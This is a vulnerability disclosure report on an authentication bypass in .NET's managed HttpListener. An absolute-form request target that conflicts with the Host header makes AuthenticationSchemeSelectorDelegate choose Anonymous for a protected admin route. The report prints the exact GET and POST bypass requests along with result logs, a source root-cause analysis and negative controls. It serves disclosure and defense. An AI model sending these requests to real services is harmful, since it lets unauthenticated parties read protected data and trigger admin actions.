# .NET HttpListener absolute-form authority confusion -> AuthenticationSchemeSelectorDelegate bypass

## Status

Validated end-to-end on supported serviced runtimes using researcher-controlled local sockets only.

Clean GitHub Actions runs:

- Authority + selector causal-control run: https://github.com/SamCloudJourney/basic-website/actions/runs/35525493054
- State-changing admin-action run: https://github.com/SamCloudJourney/basic-website/actions/runs/35525740561
- Branch: `research/dotnet-runtime-authority-final-20260920`

## Attack request

```http
GET http://admin.test:<port>/admin HTTP/1.1
Host: public.test
Connection: close
```

The application uses the built-in `HttpListener.AuthenticationSchemeSelectorDelegate` to select:

- `Anonymous` for `public.test`
- `Basic` for `admin.test`

The protected resource is selected from `HttpListenerRequest.Url.Host`.

## Supported runtime results

| Runtime / OS | Ordinary public | Ordinary admin | Conflicting absolute-form | Result |
| --- | --- | --- | --- | --- |
| .NET 8.0.31 / Ubuntu 24.04 | 200 Anonymous | 401 Basic | 200 Anonymous + admin sentinel | vulnerable |
| .NET 9.0.20 / Ubuntu 24.04 | 200 Anonymous | 401 Basic | 200 Anonymous + admin sentinel | vulnerable |
| .NET 10.0.12 / Ubuntu 24.04 | 200 Anonymous | 401 Basic | 200 Anonymous + admin sentinel | vulnerable |
| .NET 10.0.12 / macOS 15.7.9 | 200 Anonymous | 401 Basic | 200 Anonymous + admin sentinel | vulnerable |
| .NET 10.0.12 / Windows/http.sys | 200 Anonymous | 401 Basic | 401 Basic | negative control |

Decisive managed result:

```text
RESULT case=ABSOLUTE_ADMIN_HOST_PUBLIC first=HTTP/1.1 200 OK
context=True
selectorUserHost=public.test
selectorUrlHost=admin.test
scheme=Anonymous
contextUserHost=public.test
contextUrlHost=admin.test
sentinel=True

AUTHENTICATION_SCHEME_SELECTOR_BYPASS=CONFIRMED
```

Windows negative control:

```text
RESULT case=ABSOLUTE_ADMIN_HOST_PUBLIC first=HTTP/1.1 401 Unauthorized
context=False
selectorUserHost=admin.test:<port>
selectorUrlHost=admin.test
scheme=Basic
sentinel=False

WINDOWS_HTTP_SYS_NEGATIVE_CONTROL=PASS
```

## Causal selector control

The exact same malicious request was replayed with the selector using `Request.Url.Host` rather than `UserHostName`.

On Linux/macOS it becomes:

```text
HTTP/1.1 401 Unauthorized
scheme=Basic
sentinel=False
URL_HOST_SELECTOR_NEGATIVE_CONTROL=PASS
```

This isolates the bypass to the managed implementation exposing stale Host-header authority through `UserHostName` while `Url.Host` uses the absolute request-target authority.

## Current source root cause

Validated source commit during research:

`12921b1d8c6865a774232de9379133020ad23d79`

Managed `HttpListenerRequest.FinishInitialization()` begins with:

```cs
ReadOnlySpan<char> host = UserHostName;
```

For an absolute-form request target it later changes only the local host used to build `Request.Url`:

```cs
if (raw_uri != null)
    host = raw_uri.Host;
```

But the public `UserHostName` property remains:

```cs
public string UserHostName => Headers[HttpKnownHeaderNames.Host]!;
```

Therefore managed HttpListener exposes two different attacker-controlled authorities for one request.

## Protocol invariant

RFC 9112 section 3.2.2 requires an origin server receiving absolute-form to ignore the received Host field and use the request-target authority.

Reference:
https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2.2

## Microsoft-documented security-sensitive use

Microsoft documents `AuthenticationSchemeSelectorDelegate` as selecting which authentication protocol HttpListener requires for an incoming request.

Microsoft also documents that applications can choose different authentication mechanisms based on request characteristics, including `Url` or `UserHostName`.

References:

- https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener.authenticationschemeselectordelegate
- https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener.authenticationschemes
- https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistenerrequest.userhostname

## Security chain

```text
REMOTE UNAUTHENTICATED CLIENT
    ->
absolute-form target authority = admin.test
Host header = public.test
    ->
managed HttpListener:
UserHostName = public.test
Url.Host = admin.test
    ->
AuthenticationSchemeSelectorDelegate(UserHostName)
selects Anonymous
    ->
ordinary / admin.test request would have selected Basic and returned 401
    ->
request is delivered anonymously
    ->
application routes using Url.Host == admin.test
    ->
AUTH_SCHEME_BYPASS_SENTINEL_c2a7 returned to unauthenticated client
```

All endpoints, names, credentials, and secrets used by the reproduction are synthetic and researcher-controlled.


## Framework-owned authentication boundary

This is not only an application-level authorization pattern. The decisive reproduction uses
`HttpListener.AuthenticationSchemeSelectorDelegate`, a framework authentication feature.

Microsoft's current documentation for `HttpListener.AuthenticationSchemes` explicitly states that:
- HttpListener returns an incoming request to application code only after successful authentication; and
- applications that need different authentication mechanisms based on request characteristics may choose based on `Url` or `UserHostName` via `AuthenticationSchemeSelectorDelegate`.

The vulnerable managed implementation makes those two Microsoft-documented selector inputs disagree for the same request.

Documentation:
https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener.authenticationschemes?view=net-10.0

## Integrity terminal

The clean proof also protects a synthetic state-changing admin action with Basic authentication.

Normal unauthenticated request:

```http
POST /admin-action HTTP/1.1
Host: admin.test
Content-Length: 0
```

Result:

```text
401 Unauthorized
stateChange=False
```

Conflicting absolute-form request:

```http
POST http://admin.test:<port>/admin-action HTTP/1.1
Host: public.test
Content-Length: 0
```

On managed Linux/macOS, the built-in selector chooses Anonymous from `UserHostName=public.test`,
while routing sees `Url.Host=admin.test`. The protected action executes and returns:

```text
ADMIN_STATE_CHANGE_SENTINEL_83bd
ADMIN_ACTION_EXECUTED=true
```

The Windows/http.sys negative control challenges the same request with Basic authentication and does not execute the action.

This demonstrates both confidentiality (protected admin secret retrieval) and integrity (protected admin action execution)
using synthetic, researcher-controlled resources.


## Supported servicing and recent-security-fix distinction

The final proof was run on the latest supported servicing releases available on 2026-09-20:

- .NET 8.0.31
- .NET 9.0.20
- .NET 10.0.12

Microsoft's support policy lists those as the current patches as of the September 2026 servicing release.

This finding also survives the recent managed-HttpListener security hardening around request framing.
The public August 2026 HttpListener advisory/fix addressed Content-Length desynchronization and related
request-smuggling parsing behavior. The authority-confusion path here does not depend on Content-Length
parsing, duplicate Content-Length, Transfer-Encoding ambiguity, malformed chunk sizes, or header-name whitespace.

The decisive request is simply an absolute-form request-target whose authority conflicts with the Host field:

```http
GET http://admin.test:<port>/admin HTTP/1.1
Host: public.test
```

The relevant managed authority construction remains present in current runtime source commit
`12921b1d8c6865a774232de9379133020ad23d79`.
